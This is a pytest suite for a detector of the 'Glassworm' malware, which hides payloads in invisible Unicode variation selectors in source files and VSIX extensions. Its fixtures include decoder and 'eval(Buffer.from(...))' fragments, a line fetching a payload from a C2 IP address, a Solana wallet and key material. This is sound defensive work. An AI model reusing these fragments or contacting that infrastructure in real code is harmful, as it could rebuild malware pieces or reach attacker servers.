"""Tests for glassworm_detect.py.

Run with: uv run pytest
"""

import os
import zipfile


from glassworm_detect import (
    _is_warn,
    _scan_bytes,
    has_decoder_pattern,
    has_eval_pattern,
    has_infrastructure_iocs,
    has_invisible_chars,
    has_lifecycle_hooks,
    has_obfuscation_markers,
    scan_file,
    scan_vsix,
    walk_and_scan,
)

# ---------------------------------------------------------------------------
# Helpers to build raw byte payloads for testing
# ---------------------------------------------------------------------------


def _encode_vs(codepoint: int) -> bytes:
    """Encode a single Unicode code point to UTF-8 bytes."""
    return chr(codepoint).encode("utf-8")


def _make_vs_range1(count: int) -> bytes:
    """Generate `count` variation selectors from U+FE00–U+FE0F."""
    return b"".join(_encode_vs(0xFE00 + (i % 16)) for i in range(count))


def _make_vs_range2(count: int) -> bytes:
    """Generate `count` variation selectors from U+E0100–U+E01EF."""
    return b"".join(_encode_vs(0xE0100 + (i % 240)) for i in range(count))


# ---------------------------------------------------------------------------
# has_invisible_chars
# ---------------------------------------------------------------------------


class TestHasInvisibleChars:
    def test_empty_input(self):
        assert has_invisible_chars(b"") == []

    def test_clean_ascii(self):
        assert has_invisible_chars(b"console.log('hello world');") == []

    def test_single_vs_below_threshold(self):
        """One variation selector (e.g. emoji modifier) should not trigger."""
        data = b"warning \xe2\x9a\xa0\xef\xb8\x8f sign"  # ⚠️
        assert has_invisible_chars(data) == []

    def test_two_vs_below_threshold(self):
        data = _make_vs_range1(2)
        assert has_invisible_chars(data) == []

    def test_three_vs_triggers(self):
        data = _make_vs_range1(3)
        assert len(has_invisible_chars(data)) == 3

    def test_range1_all_selectors(self):
        """All 16 selectors in U+FE00–U+FE0F should be detected."""
        for cp in range(0xFE00, 0xFE10):
            data = _make_vs_range1(3)  # need 3 to clear threshold
            offsets = has_invisible_chars(data)
            assert len(offsets) == 3, f"U+{cp:04X} not detected"

    def test_range2_all_selectors(self):
        """All 240 selectors in U+E0100–U+E01EF should be detected.

        This is the regression test for the fourth-byte bug: selectors
        where the fourth UTF-8 byte is 0xB0–0xBF (third byte 0x84–0x86)
        were previously missed.
        """
        for cp in range(0xE0100, 0xE01F0):
            raw = _encode_vs(cp)
            # Pad with two more selectors to clear the 3-hit threshold.
            data = raw + _encode_vs(0xFE00) + _encode_vs(0xFE01) + _encode_vs(0xFE02)
            offsets = has_invisible_chars(data)
            assert len(offsets) == 4, f"U+{cp:05X} (bytes {raw.hex(' ')}) not detected"

    def test_range2_boundary_below(self):
        """U+E00FF is NOT a variation selector — should not be detected."""
        raw = _encode_vs(0xE00FF)
        data = raw * 5
        assert has_invisible_chars(data) == []

    def test_range2_boundary_above(self):
        """U+E01F0 is NOT a variation selector — should not be detected."""
        raw = _encode_vs(0xE01F0)
        data = raw * 5
        assert has_invisible_chars(data) == []

    def test_mixed_ranges(self):
        data = _make_vs_range1(2) + _make_vs_range2(2)
        assert len(has_invisible_chars(data)) == 4

    def test_vs_interleaved_with_ascii(self):
        data = (
            b"a"
            + _encode_vs(0xFE00)
            + b"b"
            + _encode_vs(0xFE01)
            + b"c"
            + _encode_vs(0xFE02)
        )
        assert len(has_invisible_chars(data)) == 3

    def test_previously_missed_selectors(self):
        """Specifically test the selectors that the old code missed.

        These are U+E0130–E013F, U+E0170–E017F, U+E01B0–E01BF
        (fourth byte 0xB0–0xBF when third byte is 0x84, 0x85, 0x86).
        """
        missed_ranges = [
            (0xE0130, 0xE0140),  # third byte 0x84, fourth 0xB0–0xBF
            (0xE0170, 0xE0180),  # third byte 0x85, fourth 0xB0–0xBF
            (0xE01B0, 0xE01C0),  # third byte 0x86, fourth 0xB0–0xBF
        ]
        for start, end in missed_ranges:
            for cp in range(start, end):
                raw = _encode_vs(cp)
                data = raw + _make_vs_range1(3)
                offsets = has_invisible_chars(data)
                assert len(offsets) == 4, (
                    f"U+{cp:05X} (bytes {raw.hex(' ')}) not detected — "
                    f"this was the bug fixed in the fourth-byte range"
                )


# ---------------------------------------------------------------------------
# has_decoder_pattern
# ---------------------------------------------------------------------------


class TestHasDecoderPattern:
    def test_no_match(self):
        assert has_decoder_pattern(b"console.log('hello')") == []

    def test_range1_spaced(self):
        data = b"w.codePointAt(0) >= 0xFE00 ? w.codePointAt(0) - 0xFE00"
        matches = has_decoder_pattern(data)
        assert any("- 0xFE00" in m for m in matches)

    def test_range1_minified(self):
        data = b"w.codePointAt(0)>=0xFE00?w.codePointAt(0)-0xFE00"
        matches = has_decoder_pattern(data)
        assert any("-0xFE00" in m for m in matches)

    def test_range2_spaced(self):
        data = b"w.codePointAt(0) - 0xE0100 + 16"
        matches = has_decoder_pattern(data)
        assert any("- 0xE0100 + 16" in m for m in matches)

    def test_range2_minified(self):
        data = b"w.codePointAt(0)-0xE0100+16"
        matches = has_decoder_pattern(data)
        assert any("-0xE0100+16" in m for m in matches)

    def test_different_variable_names(self):
        """Decoder sigs should match regardless of the variable name."""
        for var in [b"x", b"ch", b"c", b"codePoint", b"_a"]:
            data = var + b" - 0xFE00"
            matches = has_decoder_pattern(data)
            assert len(matches) > 0, (
                f"Failed to match with variable name '{var.decode()}'"
            )

    def test_self_detection_avoidance(self):
        """The detector's own source should NOT trigger decoder sigs.

        Signatures are split with concatenation (e.g. b'FE' + b'00')
        so the raw source bytes never contain the assembled pattern.
        """
        here = os.path.dirname(os.path.abspath(__file__))
        src = os.path.join(here, "glassworm_detect.py")
        with open(src, "rb") as f:
            data = f.read()
        assert has_decoder_pattern(data) == []


# ---------------------------------------------------------------------------
# has_eval_pattern
# ---------------------------------------------------------------------------


class TestHasEvalPattern:
    def test_no_match(self):
        assert has_eval_pattern(b"Buffer.from('hello')") == []

    def test_eval_buffer_from(self):
        data = b"eval(Buffer.from(decoded))"
        matches = has_eval_pattern(data)
        assert len(matches) > 0

    def test_eval_buffer_from_s(self):
        data = b"eval(Buffer.from(s(hidden)))"
        matches = has_eval_pattern(data)
        assert len(matches) > 0

    def test_self_detection_avoidance(self):
        here = os.path.dirname(os.path.abspath(__file__))
        src = os.path.join(here, "glassworm_detect.py")
        with open(src, "rb") as f:
            data = f.read()
        assert has_eval_pattern(data) == []


# ---------------------------------------------------------------------------
# has_infrastructure_iocs
# ---------------------------------------------------------------------------


class TestHasInfrastructureIocs:
    def test_no_match(self):
        assert has_infrastructure_iocs(b"normal code here") == []

    def test_solana_wallet(self):
        data = b"addr = 'BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC'"
        assert len(has_infrastructure_iocs(data)) > 0

    def test_c2_ip(self):
        data = b"fetch('http://45.32.150.251/payload')"
        assert len(has_infrastructure_iocs(data)) > 0

    def test_crypto_material(self):
        data = b"key = 'wDO6YyTm6DL0T0zJ0SXhUql5Mo0pdlSz'"
        assert len(has_infrastructure_iocs(data)) > 0

    def test_memo_program(self):
        data = b"MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr"
        assert len(has_infrastructure_iocs(data)) > 0

    def test_solana_rpc_method(self):
        data = b'{"method":"getSignaturesForAddress","params":["wallet"]}'
        assert len(has_infrastructure_iocs(data)) > 0

    def test_self_detection_avoidance(self):
        here = os.path.dirname(os.path.abspath(__file__))
        src = os.path.join(here, "glassworm_detect.py")
        with open(src, "rb") as f:
            data = f.read()
        assert has_infrastructure_iocs(data) == []


# ---------------------------------------------------------------------------
# has_obfuscation_markers
# ---------------------------------------------------------------------------


class TestHasObfuscationMarkers:
    def test_clean_code(self):
        assert has_obfuscation_markers(b"const x = 1; function foo() {}") == 0

    def test_below_threshold(self):
        data = b"var _0x1 = 1; var _0x2 = 2;"  # only 2 occurrences
        assert has_obfuscation_markers(data) == 0

    def test_at_threshold(self):
        data = b" ".join(b"_0x%x" % i for i in range(20))
        assert has_obfuscation_markers(data) == 20

    def test_heavily_obfuscated(self):
        data = b" ".join(b"_0x%x" % i for i in range(500))
        assert has_obfuscation_markers(data) == 500

    def test_self_detection_avoidance(self):
        here = os.path.dirname(os.path.abspath(__file__))
        src = os.path.join(here, "glassworm_detect.py")
        with open(src, "rb") as f:
            data = f.read()
        assert has_obfuscation_markers(data) == 0


# ---------------------------------------------------------------------------
# has_lifecycle_hooks
# ---------------------------------------------------------------------------


class TestHasLifecycleHooks:
    def test_clean_package_json(self):
        data = b'{"name": "my-pkg", "scripts": {"test": "jest"}}'
        assert has_lifecycle_hooks(data) == []

    def test_preinstall(self):
        data = b'{"scripts": {"preinstall": "node install.js"}}'
        matches = has_lifecycle_hooks(data)
        assert len(matches) == 1
        assert "preinstall" in matches[0]

    def test_postinstall(self):
        data = b'{"scripts": {"postinstall": "node setup.js"}}'
        matches = has_lifecycle_hooks(data)
        assert len(matches) == 1
        assert "postinstall" in matches[0]

    def test_both_hooks(self):
        data = b'{"scripts": {"preinstall": "node a.js", "postinstall": "node b.js"}}'
        assert len(has_lifecycle_hooks(data)) == 2

    def test_self_detection_avoidance(self):
        here = os.path.dirname(os.path.abspath(__file__))
        src = os.path.join(here, "glassworm_detect.py")
        with open(src, "rb") as f:
            data = f.read()
        assert has_lifecycle_hooks(data) == []


# ---------------------------------------------------------------------------
# _scan_bytes (composite logic)
# ---------------------------------------------------------------------------


class TestScanBytes:
    def test_clean_data(self):
        assert _scan_bytes(b"perfectly normal javascript") == {}

    def test_decoder_only(self):
        data = b"x - 0xFE00"
        result = _scan_bytes(data)
        assert "decoder_patterns" in result
        assert "invisible_chars" not in result

    def test_eval_only(self):
        data = b"eval(Buffer.from(x))"
        result = _scan_bytes(data)
        assert "eval_patterns" in result

    def test_infra_only(self):
        data = b"45.32.150.251"
        result = _scan_bytes(data)
        assert "infrastructure" in result

    def test_invisible_chars_with_decoder_is_hit(self):
        """Invisible chars + decoder pattern = confirmed hit."""
        vs = _make_vs_range1(5)
        data = vs + b"x - 0xFE00"
        result = _scan_bytes(data)
        assert "decoder_patterns" in result
        assert "invisible_chars" in result
        assert "note" not in result

    def test_invisible_chars_with_eval_is_hit(self):
        vs = _make_vs_range1(5)
        data = vs + b"eval(Buffer.from(s(x)))"
        result = _scan_bytes(data)
        assert "eval_patterns" in result
        assert "invisible_chars" in result

    def test_invisible_chars_with_infra_is_hit(self):
        vs = _make_vs_range1(5)
        data = vs + b"45.32.150.251"
        result = _scan_bytes(data)
        assert "infrastructure" in result
        assert "invisible_chars" in result

    def test_invisible_chars_alone_below_50_ignored(self):
        """3–49 variation selectors with no other indicator = silent."""
        vs = _make_vs_range1(10)
        result = _scan_bytes(vs)
        assert result == {}

    def test_invisible_chars_alone_at_50_is_warning(self):
        """50+ variation selectors with no other indicator = warning."""
        vs = _make_vs_range1(16) + _make_vs_range2(34)
        result = _scan_bytes(vs)
        assert "invisible_chars" in result
        assert "note" in result

    def test_full_glassworm_payload(self):
        """Simulate a complete Glassworm payload with all indicators."""
        vs = _make_vs_range1(16) + _make_vs_range2(100)
        decoder = b"ch - 0xFE00"
        eval_sink = b"eval(Buffer.from(s(x)))"
        c2 = b"45.32.150.251"
        data = vs + decoder + eval_sink + c2
        result = _scan_bytes(data)
        assert "decoder_patterns" in result
        assert "eval_patterns" in result
        assert "infrastructure" in result
        assert "invisible_chars" in result
        assert "note" not in result

    def test_obfuscation_alone_is_warning(self):
        data = b" ".join(b"_0x%x" % i for i in range(30))
        result = _scan_bytes(data)
        assert "obfuscation" in result
        assert "note" in result

    def test_obfuscation_with_infra_is_hit(self):
        obf = b" ".join(b"_0x%x" % i for i in range(30))
        data = obf + b" 45.32.150.251"
        result = _scan_bytes(data)
        assert "obfuscation" in result
        assert "infrastructure" in result
        assert "note" not in result

    def test_obfuscation_with_rpc_method_is_hit(self):
        obf = b" ".join(b"_0x%x" % i for i in range(30))
        data = obf + b" getSignaturesForAddress"
        result = _scan_bytes(data)
        assert "obfuscation" in result
        assert "infrastructure" in result
        assert "note" not in result

    def test_rpc_method_alone_is_hit(self):
        data = b'{"method":"getSignaturesForAddress"}'
        result = _scan_bytes(data)
        assert "infrastructure" in result


# ---------------------------------------------------------------------------
# _is_warn
# ---------------------------------------------------------------------------


class TestIsWarn:
    def test_hit_is_not_warn(self):
        r = {"decoder_patterns": ["- 0xFE00"], "invisible_chars": 100}
        assert not _is_warn(r)

    def test_warn_is_warn(self):
        r = {"invisible_chars": 60, "note": "high count without decoder"}
        assert _is_warn(r)

    def test_empty_is_not_warn(self):
        assert not _is_warn({})

    def test_obfuscation_warn_is_warn(self):
        r = {
            "obfuscation": 50,
            "note": "javascript-obfuscator patterns without other IoCs",
        }
        assert _is_warn(r)

    def test_obfuscation_with_infra_is_not_warn(self):
        r = {"obfuscation": 50, "infrastructure": ["45.32.150.251"]}
        assert not _is_warn(r)


# ---------------------------------------------------------------------------
# scan_file
# ---------------------------------------------------------------------------


class TestScanFile:
    def test_clean_file(self, tmp_path):
        f = tmp_path / "clean.js"
        f.write_bytes(b"console.log('hello');")
        assert scan_file(str(f)) is None

    def test_malicious_file(self, tmp_path):
        f = tmp_path / "evil.js"
        vs = _make_vs_range1(10)
        f.write_bytes(vs + b"x - 0xFE00" + b"eval(Buffer.from(s(x)))")
        result = scan_file(str(f))
        assert result is not None
        assert result["path"] == str(f)
        assert "decoder_patterns" in result

    def test_nonexistent_file(self):
        assert scan_file("/nonexistent/path/to/file.js") is None

    def test_permission_error(self, tmp_path):
        f = tmp_path / "locked.js"
        f.write_bytes(b"x - 0xFE00")
        f.chmod(0o000)
        try:
            result = scan_file(str(f))
            # If not running as root, the read should fail gracefully.
            if os.getuid() != 0:
                assert result is None
        finally:
            f.chmod(0o644)


# ---------------------------------------------------------------------------
# scan_vsix
# ---------------------------------------------------------------------------


class TestScanVsix:
    def test_clean_vsix(self, tmp_path):
        vsix = tmp_path / "clean.vsix"
        with zipfile.ZipFile(vsix, "w") as zf:
            zf.writestr("extension/main.js", "console.log('clean');")
        assert scan_vsix(str(vsix)) == []

    def test_malicious_vsix(self, tmp_path):
        vsix = tmp_path / "evil.vsix"
        payload = _make_vs_range1(10) + b"x - 0xFE00" + b"eval(Buffer.from(s(x)))"
        with zipfile.ZipFile(vsix, "w") as zf:
            zf.writestr("extension/main.js", payload)
        results = scan_vsix(str(vsix))
        assert len(results) == 1
        assert "evil.vsix!extension/main.js" in results[0]["path"]

    def test_vsix_skips_non_source(self, tmp_path):
        vsix = tmp_path / "mixed.vsix"
        payload = b"x - 0xFE00"
        with zipfile.ZipFile(vsix, "w") as zf:
            zf.writestr("extension/icon.png", payload)
            zf.writestr("extension/main.js", b"clean")
        assert scan_vsix(str(vsix)) == []

    def test_bad_zip(self, tmp_path):
        bad = tmp_path / "bad.vsix"
        bad.write_bytes(b"not a zip file")
        assert scan_vsix(str(bad)) == []


# ---------------------------------------------------------------------------
# walk_and_scan
# ---------------------------------------------------------------------------


class TestWalkAndScan:
    def _make_tree(self, tmp_path):
        """Build a directory tree with clean and malicious files."""
        src = tmp_path / "project" / "src"
        src.mkdir(parents=True)
        (src / "clean.js").write_bytes(b"module.exports = {};")

        payload = _make_vs_range1(10) + b"x - 0xFE00"
        (src / "evil.ts").write_bytes(payload)

        # File with non-source extension should be skipped.
        (src / "data.bin").write_bytes(payload)

        # Skipped directory.
        git = tmp_path / "project" / ".git"
        git.mkdir()
        (git / "config").write_bytes(payload)

        return tmp_path / "project"

    def test_finds_malicious_source(self, tmp_path):
        root = self._make_tree(tmp_path)
        results = walk_and_scan(str(root), quiet=True)
        paths = [r["path"] for r in results]
        assert any("evil.ts" in p for p in paths)

    def test_skips_non_source_extension(self, tmp_path):
        root = self._make_tree(tmp_path)
        results = walk_and_scan(str(root), quiet=True)
        paths = [r["path"] for r in results]
        assert not any("data.bin" in p for p in paths)

    def test_skips_git_dir(self, tmp_path):
        root = self._make_tree(tmp_path)
        results = walk_and_scan(str(root), quiet=True)
        paths = [r["path"] for r in results]
        assert not any(".git" in p for p in paths)

    def test_skips_node_modules_by_default(self, tmp_path):
        root = self._make_tree(tmp_path)
        nm = root / "node_modules" / "evil-pkg"
        nm.mkdir(parents=True)
        payload = _make_vs_range1(10) + b"x - 0xFE00"
        (nm / "index.js").write_bytes(payload)

        results = walk_and_scan(str(root), include_node_modules=False, quiet=True)
        paths = [r["path"] for r in results]
        # Check for the actual directory separator to avoid matching the
        # pytest tmp dir name (which contains the test function name).
        assert not any(os.sep + "node_modules" + os.sep in p for p in paths)

    def test_includes_node_modules_when_asked(self, tmp_path):
        root = self._make_tree(tmp_path)
        nm = root / "node_modules" / "evil-pkg"
        nm.mkdir(parents=True)
        payload = _make_vs_range1(10) + b"x - 0xFE00"
        (nm / "index.js").write_bytes(payload)

        results = walk_and_scan(str(root), include_node_modules=True, quiet=True)
        paths = [r["path"] for r in results]
        assert any("node_modules" in p for p in paths)

    def test_init_json_flagged(self, tmp_path):
        root = self._make_tree(tmp_path)
        payload = b"45.32.150.251"
        (root / "init.json").write_bytes(payload)

        results = walk_and_scan(str(root), quiet=True)
        init_results = [r for r in results if r.get("init_json")]
        assert len(init_results) == 1

    def test_vsix_in_tree(self, tmp_path):
        root = self._make_tree(tmp_path)
        vsix = root / "ext.vsix"
        payload = _make_vs_range1(10) + b"x - 0xFE00"
        with zipfile.ZipFile(vsix, "w") as zf:
            zf.writestr("main.js", payload)

        results = walk_and_scan(str(root), quiet=True)
        paths = [r["path"] for r in results]
        assert any("ext.vsix!" in p for p in paths)

    def test_package_json_lifecycle_hooks_warning(self, tmp_path):
        root = self._make_tree(tmp_path)
        pkg = b'{"scripts": {"preinstall": "node install.js"}}'
        (root / "package.json").write_bytes(pkg)

        results = walk_and_scan(str(root), quiet=True)
        pkg_results = [r for r in results if r.get("package_json")]
        assert len(pkg_results) == 1
        assert "lifecycle_hooks" in pkg_results[0]
        assert "note" in pkg_results[0]

    def test_package_json_lifecycle_hooks_with_infra_is_hit(self, tmp_path):
        root = self._make_tree(tmp_path)
        pkg = b'{"scripts": {"preinstall": "node install.js"}} 45.32.150.251'
        (root / "package.json").write_bytes(pkg)

        results = walk_and_scan(str(root), quiet=True)
        pkg_results = [r for r in results if r.get("package_json")]
        assert len(pkg_results) == 1
        assert "lifecycle_hooks" in pkg_results[0]
        assert "infrastructure" in pkg_results[0]
        assert "note" not in pkg_results[0]

    def test_package_json_clean_ignored(self, tmp_path):
        root = self._make_tree(tmp_path)
        pkg = b'{"name": "my-pkg", "scripts": {"test": "jest"}}'
        (root / "package.json").write_bytes(pkg)

        results = walk_and_scan(str(root), quiet=True)
        pkg_results = [r for r in results if r.get("package_json")]
        assert len(pkg_results) == 0

    def test_empty_directory(self, tmp_path):
        empty = tmp_path / "empty"
        empty.mkdir()
        assert walk_and_scan(str(empty), quiet=True) == []

    def test_new_extensions_scanned(self, tmp_path):
        """Verify .mts, .cts, .vue, .svelte files are scanned."""
        root = tmp_path / "project"
        root.mkdir()
        payload = _make_vs_range1(10) + b"x - 0xFE00"
        for ext in [".mts", ".cts", ".vue", ".svelte"]:
            (root / f"file{ext}").write_bytes(payload)

        results = walk_and_scan(str(root), quiet=True)
        found_exts = {os.path.splitext(r["path"])[1] for r in results}
        assert {".mts", ".cts", ".vue", ".svelte"} <= found_exts
